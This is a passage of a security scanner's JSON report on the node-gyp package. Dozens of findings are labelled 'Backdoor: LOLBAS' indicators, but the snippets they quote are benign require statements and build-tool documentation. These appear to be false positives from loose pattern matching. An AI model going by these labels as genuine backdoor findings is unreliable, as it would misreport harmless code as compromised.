                      "markdown": "`\n  // 0.x.y-pre versions are not published yet and cannot be installed. Bail.\n  if (release.semver.prerelease[0] === 'pre') {\n    log.verbose('detected \"pre\" node version', release.version)\n    if (!gyp.opts.nodedir) {\n      throw new Error('\"pre\" versions of node cannot be installed, use the --nodedir flag instead')\n    }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/install.js"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 5,
                  "endLine": 6,
                  "endColumn": 10,
                  "snippet": {
                    "text": "const { createWriteStream, promises: fs } = require('graceful-fs')\nconst os = require('os')\nconst { backOff } = require('exponential-backoff')\nconst tar = require('tar')\nconst path = require('path')\nconst { Transform, promises: { pipeline } } = require('stream')\nconst crypto = require('crypto')\n",
                    "rendered": {
                      "text": "const { createWriteStream, promises: fs } = require('graceful-fs')\nconst os = require('os')\nconst { backOff } = require('exponential-backoff')\nconst tar = require('tar')\nconst path = require('path')\nconst { Transform, promises: { pipeline } } = require('stream')\nconst crypto = require('crypto')\n",
                      "markdown": "`const { createWriteStream, promises: fs } = require('graceful-fs')\nconst os = require('os')\nconst { backOff } = require('exponential-backoff')\nconst tar = require('tar')\nconst path = require('path')\nconst { Transform, promises: { pipeline } } = require('stream')\nconst crypto = require('crypto')\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/lib/list.js"
                },
                "region": {
                  "startLine": 26,
                  "startColumn": 67,
                  "endLine": 26,
                  "endColumn": 73,
                  "snippet": {
                    "text": "}\n\nmodule.exports = list\nmodule.exports.usage = 'Prints a listing of the currently installed node development files'\n",
                    "rendered": {
                      "text": "}\n\nmodule.exports = list\nmodule.exports.usage = 'Prints a listing of the currently installed node development files'\n",
                      "markdown": "`}\n\nmodule.exports = list\nmodule.exports.usage = 'Prints a listing of the currently installed node development files'\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 410,
                  "startColumn": 40,
                  "endLine": 410,
                  "endColumn": 44,
                  "snippet": {
                    "text": "  test.must_contain_any_line(output, lines)\n```\n\nVerifies that the output string contains at least one of the \"lines\" in the\nspecified list of lines.  In practice, the lines can be any substring and need\nnot be `\\n`-terminaed lines per se.  If none of the specified lines is present,\nthe test fails.\n",
                    "rendered": {
                      "text": "  test.must_contain_any_line(output, lines)\n```\n\nVerifies that the output string contains at least one of the \"lines\" in the\nspecified list of lines.  In practice, the lines can be any substring and need\nnot be `\\n`-terminaed lines per se.  If none of the specified lines is present,\nthe test fails.\n",
                      "markdown": "`  test.must_contain_any_line(output, lines)\n```\n\nVerifies that the output string contains at least one of the \"lines\" in the\nspecified list of lines.  In practice, the lines can be any substring and need\nnot be `\\n`-terminaed lines per se.  If none of the specified lines is present,\nthe test fails.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 156,
                  "startColumn": 7,
                  "endLine": 156,
                  "endColumn": 11,
                  "snippet": {
                    "text": "\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n\n",
                    "rendered": {
                      "text": "\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n\n",
                      "markdown": "`\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 234,
                  "startColumn": 24,
                  "endLine": 234,
                  "endColumn": 30,
                  "snippet": {
                    "text": "```\n  import TestGyp\n  test = TestGyp.TestGyp(match = TestGyp.match_re,\n                         diff = TestGyp.diff_re)`\n```\n\n### Running GYP\n",
                    "rendered": {
                      "text": "```\n  import TestGyp\n  test = TestGyp.TestGyp(match = TestGyp.match_re,\n                         diff = TestGyp.diff_re)`\n```\n\n### Running GYP\n",
                      "markdown": "````\n  import TestGyp\n  test = TestGyp.TestGyp(match = TestGyp.match_re,\n                         diff = TestGyp.diff_re)`\n```\n\n### Running GYP\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 223,
                  "startColumn": 8,
                  "endLine": 223,
                  "endColumn": 16,
                  "snippet": {
                    "text": "```\n\nThis copies the contents of the directory tree in which\nthe test script lives to a temporary directory for execution,\nand arranges for the temporary directory's removal on exit.\n\nBy default, any comparisons of output or file contents\n",
                    "rendered": {
                      "text": "```\n\nThis copies the contents of the directory tree in which\nthe test script lives to a temporary directory for execution,\nand arranges for the temporary directory's removal on exit.\n\nBy default, any comparisons of output or file contents\n",
                      "markdown": "````\n\nThis copies the contents of the directory tree in which\nthe test script lives to a temporary directory for execution,\nand arranges for the temporary directory's removal on exit.\n\nBy default, any comparisons of output or file contents\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 202,
                  "startColumn": 7,
                  "endLine": 202,
                  "endColumn": 15,
                  "snippet": {
                    "text": "  $\n```\n\n## Test script functions and methods\n\nThe `TestGyp` class contains a lot of functionality\nintended to make it easy to write tests.\n",
                    "rendered": {
                      "text": "  $\n```\n\n## Test script functions and methods\n\nThe `TestGyp` class contains a lot of functionality\nintended to make it easy to write tests.\n",
                      "markdown": "`  $\n```\n\n## Test script functions and methods\n\nThe `TestGyp` class contains a lot of functionality\nintended to make it easy to write tests.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 170,
                  "startColumn": 28,
                  "endLine": 170,
                  "endColumn": 36,
                  "snippet": {
                    "text": "\n# Specifying the format (build tool) to use\n\nBy default, the `gyptest.py` script will generate configurations for\nthe \"primary\" supported build tool for the platform you're on:\nVisual Studio on Windows,\nXcode on Mac,\n",
                    "rendered": {
                      "text": "\n# Specifying the format (build tool) to use\n\nBy default, the `gyptest.py` script will generate configurations for\nthe \"primary\" supported build tool for the platform you're on:\nVisual Studio on Windows,\nXcode on Mac,\n",
                      "markdown": "`\n# Specifying the format (build tool) to use\n\nBy default, the `gyptest.py` script will generate configurations for\nthe \"primary\" supported build tool for the platform you're on:\nVisual Studio on Windows,\nXcode on Mac,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 155,
                  "startColumn": 16,
                  "endLine": 155,
                  "endColumn": 24,
                  "snippet": {
                    "text": "```\n\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n",
                    "rendered": {
                      "text": "```\n\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n",
                      "markdown": "````\n\nIf any tests fail during the run,\nthe `gyptest.py` script will report them in a\nsummary at the end.\n\n## Debugging tests\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/Testing.md"
                },
                "region": {
                  "startLine": 64,
                  "startColumn": 8,
                  "endLine": 64,
                  "endColumn": 16,
                  "snippet": {
                    "text": "  test.pass_test()\n```\n\nThe test script above runs GYP against the specified input file\n(`hello.gyp`) to generate a build configuration.\nIt then tries to build the `'all'` target\n(or its equivalent) using the generated build configuration.\n",
                    "rendered": {
                      "text": "  test.pass_test()\n```\n\nThe test script above runs GYP against the specified input file\n(`hello.gyp`) to generate a build configuration.\nIt then tries to build the `'all'` target\n(or its equivalent) using the generated build configuration.\n",
                      "markdown": "`  test.pass_test()\n```\n\nThe test script above runs GYP against the specified input file\n(`hello.gyp`) to generate a build configuration.\nIt then tries to build the `'all'` target\n(or its equivalent) using the generated build configuration.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 429,
                  "startColumn": 28,
                  "endLine": 429,
                  "endColumn": 32,
                  "snippet": {
                    "text": "    * L10N\n    * Vendor\n    * Purify / Valgrind\n  * Will everyone upgrade VS at once?\n  * What does a dylib dependency mean?\n",
                    "rendered": {
                      "text": "    * L10N\n    * Vendor\n    * Purify / Valgrind\n  * Will everyone upgrade VS at once?\n  * What does a dylib dependency mean?\n",
                      "markdown": "`    * L10N\n    * Vendor\n    * Purify / Valgrind\n  * Will everyone upgrade VS at once?\n  * What does a dylib dependency mean?\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 422,
                  "startColumn": 12,
                  "endLine": 423,
                  "snippet": {
                    "text": "  * Variants are difficult.  We've identified the following variants (some\n    specific to Chromium, some typical of other projects in the same ballpark):\n    * Target platform\n    * V8 vs. JSC\n    * Debug vs. Release\n    * Toolchain (VS version, gcc, version)\n    * Host platform\n    * L10N\n",
                    "rendered": {
                      "text": "  * Variants are difficult.  We've identified the following variants (some\n    specific to Chromium, some typical of other projects in the same ballpark):\n    * Target platform\n    * V8 vs. JSC\n    * Debug vs. Release\n    * Toolchain (VS version, gcc, version)\n    * Host platform\n    * L10N\n",
                      "markdown": "`  * Variants are difficult.  We've identified the following variants (some\n    specific to Chromium, some typical of other projects in the same ballpark):\n    * Target platform\n    * V8 vs. JSC\n    * Debug vs. Release\n    * Toolchain (VS version, gcc, version)\n    * Host platform\n    * L10N\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 361,
                  "startColumn": 13,
                  "endLine": 361,
                  "endColumn": 17,
                  "snippet": {
                    "text": "  * `Project References`:\n  * `Project Configurations`:\n    * Per-`.xcodeproj` file settings are not supported, all settings are\n      applied at the target level.\n  * `Targets`:\n    * `Phases`: Copy sources, link with libraries/frameworks, ...\n    * `Target Configurations`: Specified by input.\n",
                    "rendered": {
                      "text": "  * `Project References`:\n  * `Project Configurations`:\n    * Per-`.xcodeproj` file settings are not supported, all settings are\n      applied at the target level.\n  * `Targets`:\n    * `Phases`: Copy sources, link with libraries/frameworks, ...\n    * `Target Configurations`: Specified by input.\n",
                      "markdown": "`  * `Project References`:\n  * `Project Configurations`:\n    * Per-`.xcodeproj` file settings are not supported, all settings are\n      applied at the target level.\n  * `Targets`:\n    * `Phases`: Copy sources, link with libraries/frameworks, ...\n    * `Target Configurations`: Specified by input.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 52,
                  "startColumn": 66,
                  "endLine": 53,
                  "snippet": {
                    "text": "      arbitrary Python statements.\n    * All input is expected to comply with JSON, with two exceptions:\n      the # character (not inside strings) begins a comment that lasts\n      until the end of the line, and trailing commas are permitted at\n      the end of list and dict contents.\n  * Input data is a dictionary of keywords and values.\n  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n",
                    "rendered": {
                      "text": "      arbitrary Python statements.\n    * All input is expected to comply with JSON, with two exceptions:\n      the # character (not inside strings) begins a comment that lasts\n      until the end of the line, and trailing commas are permitted at\n      the end of list and dict contents.\n  * Input data is a dictionary of keywords and values.\n  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n",
                      "markdown": "`      arbitrary Python statements.\n    * All input is expected to comply with JSON, with two exceptions:\n      the # character (not inside strings) begins a comment that lasts\n      until the end of the line, and trailing commas are permitted at\n      the end of list and dict contents.\n  * Input data is a dictionary of keywords and values.\n  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 19,
                  "startColumn": 31,
                  "endLine": 19,
                  "endColumn": 35,
                  "snippet": {
                    "text": "still allows sufficient per-platform flexibility to accommodate\nirreconcilable differences.  The fact that no obvious working candidate\nexists that meets Chromium's requirements indicates this is probably a\ntougher problem than it appears at first glance.  We aim to succeed by\ncreating a tool that is highly specific to Chromium's specific use case,\nnot to the general case of design a completely platform-independent tool\nfor expressing any possible build.\n",
                    "rendered": {
                      "text": "still allows sufficient per-platform flexibility to accommodate\nirreconcilable differences.  The fact that no obvious working candidate\nexists that meets Chromium's requirements indicates this is probably a\ntougher problem than it appears at first glance.  We aim to succeed by\ncreating a tool that is highly specific to Chromium's specific use case,\nnot to the general case of design a completely platform-independent tool\nfor expressing any possible build.\n",
                      "markdown": "`still allows sufficient per-platform flexibility to accommodate\nirreconcilable differences.  The fact that no obvious working candidate\nexists that meets Chromium's requirements indicates this is probably a\ntougher problem than it appears at first glance.  We aim to succeed by\ncreating a tool that is highly specific to Chromium's specific use case,\nnot to the general case of design a completely platform-independent tool\nfor expressing any possible build.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 351,
                  "startColumn": 56,
                  "endLine": 351,
                  "endColumn": 61,
                  "snippet": {
                    "text": "    * `Source group`: The union of the `sources` lists of all `targets`\n      after applying appropriate `conditions`.  The resulting list is\n      sorted and put into a group hierarchy that matches the layout of\n      the directory tree on disk, with a root of // (the top of the\n      hierarchy).\n    * `Frameworks group`: Taken directly from `libraries` value for the\n      target, after applying appropriate conditions.\n",
                    "rendered": {
                      "text": "    * `Source group`: The union of the `sources` lists of all `targets`\n      after applying appropriate `conditions`.  The resulting list is\n      sorted and put into a group hierarchy that matches the layout of\n      the directory tree on disk, with a root of // (the top of the\n      hierarchy).\n    * `Frameworks group`: Taken directly from `libraries` value for the\n      target, after applying appropriate conditions.\n",
                      "markdown": "`    * `Source group`: The union of the `sources` lists of all `targets`\n      after applying appropriate `conditions`.  The resulting list is\n      sorted and put into a group hierarchy that matches the layout of\n      the directory tree on disk, with a root of // (the top of the\n      hierarchy).\n    * `Frameworks group`: Taken directly from `libraries` value for the\n      target, after applying appropriate conditions.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 249,
                  "startColumn": 41,
                  "endLine": 249,
                  "endColumn": 49,
                  "snippet": {
                    "text": "`inputs`, the `outputs` are considered up-to-date and the action need\nnot be invoked.\n\nActions are implemented in Xcode as shell script build phases performed\nprior to the compilation phase.  In the Visual Studio generator, actions\nappear files with a `FileConfiguration` containing a custom\n`VCCustomBuildTool` specifying the remainder of the inputs, the outputs,\n",
                    "rendered": {
                      "text": "`inputs`, the `outputs` are considered up-to-date and the action need\nnot be invoked.\n\nActions are implemented in Xcode as shell script build phases performed\nprior to the compilation phase.  In the Visual Studio generator, actions\nappear files with a `FileConfiguration` containing a custom\n`VCCustomBuildTool` specifying the remainder of the inputs, the outputs,\n",
                      "markdown": "``inputs`, the `outputs` are considered up-to-date and the action need\nnot be invoked.\n\nActions are implemented in Xcode as shell script build phases performed\nprior to the compilation phase.  In the Visual Studio generator, actions\nappear files with a `FileConfiguration` containing a custom\n`VCCustomBuildTool` specifying the remainder of the inputs, the outputs,\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 167,
                  "startColumn": 169,
                  "endLine": 167,
                  "endColumn": 177,
                  "snippet": {
                    "text": "         | A special custom action to perform on a list of input files, to produce output files.  See the \"Rules\" section below. |\n| `sources`                    | A list of source files that are used to build this target or which should otherwise show up in the IDE for this target.  In practice, we expect this list to be a union of all files necessary to build the target on all platforms, as well as other related files that aren't actually used for building, like README files. |\n| `target_conditions`          | Like `conditions`, but evaluation is delayed until the settings have been merged into an a",
                    "rendered": {
                      "text": "         | A special custom action to perform on a list of input files, to produce output files.  See the \"Rules\" section below. |\n| `sources`                    | A list of source files that are used to build this target or which should otherwise show up in the IDE for this target.  In practice, we expect this list to be a union of all files necessary to build the target on all platforms, as well as other related files that aren't actually used for building, like README files. |\n| `target_conditions`          | Like `conditions`, but evaluation is delayed until the settings have been merged into an a",
                      "markdown": "`         | A special custom action to perform on a list of input files, to produce output files.  See the \"Rules\" section below. |\n| `sources`                    | A list of source files that are used to build this target or which should otherwise show up in the IDE for this target.  In practice, we expect this list to be a union of all files necessary to build the target on all platforms, as well as other related files that aren't actually used for building, like README files. |\n| `target_conditions`          | Like `conditions`, but evaluation is delayed until the settings have been merged into an a`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 58,
                  "startColumn": 46,
                  "endLine": 58,
                  "endColumn": 52,
                  "snippet": {
                    "text": "  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n    * TODO:  providing warnings on use of illegal keywords would help\n      users catch typos.  Figure out something nice to do with this.\n\n## Detailed Design\n\n",
                    "rendered": {
                      "text": "  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n    * TODO:  providing warnings on use of illegal keywords would help\n      users catch typos.  Figure out something nice to do with this.\n\n## Detailed Design\n\n",
                      "markdown": "`  * \"Invalid\" keywords on any given data structure are not illegal,\n    they're just ignored.\n    * TODO:  providing warnings on use of illegal keywords would help\n      users catch typos.  Figure out something nice to do with this.\n\n## Detailed Design\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/LanguageSpecification.md"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 14,
                  "endLine": 8,
                  "endColumn": 20,
                  "snippet": {
                    "text": "Create a tool for the Chromium project that generates native Visual Studio,\nXcode and SCons and/or make build files from a platform-independent input\nformat.  Make the input format as reasonably general as possible without\nspending extra time trying to \"get everything right,\" except where not doing so\nwould likely lead Chromium to an eventual dead end.  When in doubt, do what\nChromium needs and don't worry about generalizing the solution.\n\n",
                    "rendered": {
                      "text": "Create a tool for the Chromium project that generates native Visual Studio,\nXcode and SCons and/or make build files from a platform-independent input\nformat.  Make the input format as reasonably general as possible without\nspending extra time trying to \"get everything right,\" except where not doing so\nwould likely lead Chromium to an eventual dead end.  When in doubt, do what\nChromium needs and don't worry about generalizing the solution.\n\n",
                      "markdown": "`Create a tool for the Chromium project that generates native Visual Studio,\nXcode and SCons and/or make build files from a platform-independent input\nformat.  Make the input format as reasonably general as possible without\nspending extra time trying to \"get everything right,\" except where not doing so\nwould likely lead Chromium to an eventual dead end.  When in doubt, do what\nChromium needs and don't worry about generalizing the solution.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 89,
                  "startColumn": 51,
                  "endLine": 89,
                  "endColumn": 55,
                  "snippet": {
                    "text": "\nThat being said there are a number of drawbacks currently to gyp:\n\n1. Because platform specific settings are expressed at the project file\nlevel (rather than the command line level). Settings which might otherwise\nbe shared in common between platforms (flags to gcc on mac/linux), end up\nbeing repeated twice. Though in fairness there is actually less sharing here\n",
                    "rendered": {
                      "text": "\nThat being said there are a number of drawbacks currently to gyp:\n\n1. Because platform specific settings are expressed at the project file\nlevel (rather than the command line level). Settings which might otherwise\nbe shared in common between platforms (flags to gcc on mac/linux), end up\nbeing repeated twice. Though in fairness there is actually less sharing here\n",
                      "markdown": "`\nThat being said there are a number of drawbacks currently to gyp:\n\n1. Because platform specific settings are expressed at the project file\nlevel (rather than the command line level). Settings which might otherwise\nbe shared in common between platforms (flags to gcc on mac/linux), end up\nbeing repeated twice. Though in fairness there is actually less sharing here\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 68,
                  "endLine": 26,
                  "snippet": {
                    "text": "I did an exploratory port of portions of Chromium to cmake (I think I got as\nfar as net, base, sandbox, and part of webkit).\nThere were a number of motivations, not all of which would apply to other\nprojects. Also, some of the design of gyp was informed by experience at\nGoogle with large projects built wholly from source, leading to features\nabsent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\n",
                    "rendered": {
                      "text": "I did an exploratory port of portions of Chromium to cmake (I think I got as\nfar as net, base, sandbox, and part of webkit).\nThere were a number of motivations, not all of which would apply to other\nprojects. Also, some of the design of gyp was informed by experience at\nGoogle with large projects built wholly from source, leading to features\nabsent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\n",
                      "markdown": "`I did an exploratory port of portions of Chromium to cmake (I think I got as\nfar as net, base, sandbox, and part of webkit).\nThere were a number of motivations, not all of which would apply to other\nprojects. Also, some of the design of gyp was informed by experience at\nGoogle with large projects built wholly from source, leading to features\nabsent from cmake, but not strictly required for Chromium.\n\n1. Ability to incrementally transition on Windows. It took us about 6 months\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/node-gyp.zip/package/gyp/docs/GypVsCMake.md"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 62,
                  "endLine": 18,
                  "endColumn": 66,
                  "snippet": {
